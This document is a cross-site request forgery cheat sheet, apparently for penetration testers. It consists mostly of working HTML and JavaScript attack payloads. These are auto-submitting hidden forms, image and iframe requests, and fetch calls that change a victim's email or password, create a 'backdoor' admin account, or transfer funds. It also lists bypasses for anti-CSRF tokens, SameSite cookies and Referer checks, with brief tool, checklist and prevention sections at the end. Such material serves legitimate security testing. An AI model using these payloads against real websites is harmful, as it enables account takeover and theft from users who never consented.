# Cross-Site Request Forgery (CSRF)

## Description
Cross-Site Request Forgery (CSRF) is an attack that forces authenticated users to execute unwanted actions on a web application. CSRF exploits the trust a site has in a user's browser by using the user's authenticated session to perform malicious requests.

## How CSRF Works

1. User logs into vulnerable website (e.g., bank.com)
2. Browser stores session cookie
3. User visits attacker's website
4. Attacker's page makes request to bank.com
5. Browser automatically includes cookies
6. Bank processes request as legitimate

## CSRF Attack Types

### 1. GET-Based CSRF

#### With User Interaction (Link)
```html
<a href="http://target.com/transfer?to=attacker&amount=1000">Click for prize!</a>
```

#### Without Interaction (Image Tag)
```html
<img src="http://target.com/transfer?to=attacker&amount=1000" style="display:none">

<!-- Multiple requests -->
<img src="http://target.com/action1">
<img src="http://target.com/action2">
<img src="http://target.com/action3">
```

#### Using Iframe
```html
<iframe src="http://target.com/delete-account" style="display:none"></iframe>
```

### 2. POST-Based CSRF

#### Basic Auto-Submit Form
```html
<html>
<body onload="document.forms[0].submit()">
<form action="http://target.com/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
</body>
</html>
```

#### Form with Multiple Parameters
```html
<form action="http://target.com/transfer" method="POST" id="csrf-form">
    <input type="hidden" name="to_account" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
    <input type="hidden" name="currency" value="USD">
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

### 3. JSON-Based CSRF

#### Using Form with enctype
```html
<form action="http://target.com/api/update" method="POST" enctype="text/plain">
    <input name='{"email":"attacker@evil.com","padding":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

#### Using XHR (if CORS allows)
```javascript
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://target.com/api/update", true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.withCredentials = true;
xhr.send(JSON.stringify({email: "attacker@evil.com"}));
```

#### Using Fetch
```javascript
fetch('http://target.com/api/update', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({email: 'attacker@evil.com'})
});
```

### 4. File Upload CSRF
```html
<script>
function upload() {
    var form = document.createElement('form');
    form.action = 'http://target.com/upload';
    form.method = 'POST';
    form.enctype = 'multipart/form-data';

    var fileInput = document.createElement('input');
    fileInput.type = 'file';
    fileInput.name = 'file';
    form.appendChild(fileInput);

    document.body.appendChild(form);
    form.submit();
}
</script>
```

## CSRF Token Bypass Techniques

### 1. Token Not Validated
```html
<!-- Token parameter exists but isn't checked -->
<form action="http://target.com/action" method="POST">
    <input type="hidden" name="csrf_token" value="anything">
    <input type="hidden" name="action" value="delete">
</form>
```

### 2. Token Validation Based on Request Method
```html
<!-- Token only checked for POST, try GET -->
<img src="http://target.com/delete?action=delete">
```

### 3. Token Not Tied to Session
```html
<!-- Use your own valid token for victim's session -->
<form action="http://target.com/action" method="POST">
    <input type="hidden" name="csrf_token" value="attacker_valid_token">
</form>
```

### 4. Token Duplicated in Cookie
```html
<!-- If token is just compared to cookie value -->
<script>
document.cookie = "csrf_token=controlled_value; domain=target.com";
</script>
<form action="http://target.com/action" method="POST">
    <input type="hidden" name="csrf_token" value="controlled_value">
</form>
```

### 5. Token in Referer Header
```html
<!-- Include token in referer -->
<meta name="referrer" content="unsafe-url">
<!-- or -->
<a href="http://target.com/action?csrf=token" rel="noreferrer">Click</a>
```

### 6. Empty Token Accepted
```html
<form action="http://target.com/action" method="POST">
    <input type="hidden" name="csrf_token" value="">
</form>
```

### 7. Token Removed
```html
<!-- Simply remove the token parameter -->
<form action="http://target.com/action" method="POST">
    <!-- No csrf_token -->
    <input type="hidden" name="action" value="delete">
</form>
```

## SameSite Cookie Bypass

### Lax Mode Bypass
```html
<!-- SameSite=Lax allows top-level GET navigations -->
<a href="http://target.com/delete?confirm=yes">Click here</a>

<!-- Using window.open -->
<script>window.open('http://target.com/delete?confirm=yes')</script>
```

### Using Client-Side Redirect
```html
<!-- Some sites have open redirects -->
<meta http-equiv="refresh" content="0;url=http://target.com/redirect?url=/delete">
```

## Referer Header Bypass

### Empty Referer
```html
<meta name="referrer" content="no-referrer">
<form action="http://target.com/action" method="POST">
    ...
</form>
```

### Data URL (Empty Referer)
```html
<iframe src="data:text/html,<form action='http://target.com/action' method='POST'><input name='a' value='b'></form><script>document.forms[0].submit()</script>">
</iframe>
```

### Referer Validation Bypass
```
# If validation checks if referer contains target domain
https://attacker.com/target.com/page
https://target.com.attacker.com/page
https://attacker.com/?target.com
```

## Content-Type Bypass

### Flash-Based (Legacy)
```
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data
Content-Type: text/plain
```

### Using Different Content-Types
```javascript
// These don't trigger preflight
xhr.setRequestHeader("Content-Type", "text/plain");
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.setRequestHeader("Content-Type", "multipart/form-data");
```

## Exploitation Examples

### Change Email
```html
<form action="https://target.com/account/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="submit" value="Click me">
</form>
<script>document.forms[0].submit();</script>
```

### Change Password
```html
<form action="https://target.com/account/password" method="POST">
    <input type="hidden" name="new_password" value="hacked123">
    <input type="hidden" name="confirm_password" value="hacked123">
</form>
<script>document.forms[0].submit();</script>
```

### Add Admin User
```html
<form action="https://target.com/admin/users/create" method="POST">
    <input type="hidden" name="username" value="backdoor">
    <input type="hidden" name="password" value="p@ssw0rd">
    <input type="hidden" name="role" value="admin">
</form>
<script>document.forms[0].submit();</script>
```

### Transfer Funds
```html
<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

## Tools

### XSRFProbe
```bash
# Scan for CSRF vulnerabilities
xsrfprobe -u "http://target.com/action" -c "session=abc123"

# With form data
xsrfprobe -u "http://target.com/action" -d "param1=value1&param2=value2"
```

### Burp Suite
1. Intercept request
2. Right-click > Engagement tools > Generate CSRF PoC
3. Customize and test

## CSRF Checklist

- [ ] Are CSRF tokens present?
- [ ] Are tokens validated on server-side?
- [ ] Are tokens tied to user session?
- [ ] Are tokens regenerated per request?
- [ ] Does removing token bypass protection?
- [ ] Is empty token accepted?
- [ ] Is validation method-specific (POST only)?
- [ ] Can GET requests perform sensitive actions?
- [ ] Is Referer header checked?
- [ ] Can Referer check be bypassed?
- [ ] What is SameSite cookie attribute?
- [ ] Are there CORS misconfigurations?

## Prevention
```
1. Use anti-CSRF tokens
2. Validate tokens server-side
3. Tie tokens to user session
4. Use SameSite cookie attribute (Strict or Lax)
5. Verify Referer/Origin headers
6. Require re-authentication for sensitive actions
7. Use custom request headers for AJAX
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Cross-Site%20Request%20Forgery
- https://owasp.org/www-community/attacks/csrf
- https://portswigger.net/web-security/csrf
